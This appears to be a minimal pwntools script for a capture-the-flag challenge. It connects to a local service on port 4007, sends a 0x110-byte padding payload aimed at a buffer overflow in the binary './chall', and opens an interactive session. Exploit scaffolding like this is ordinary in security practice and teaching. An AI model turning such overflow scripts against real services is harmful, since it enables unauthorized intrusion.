from pwn import *

exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

# Instead of process(exe):
io = remote("127.0.0.1", 4007)

payload = b'A'*0x110
io.sendline(payload)
io.interactive()

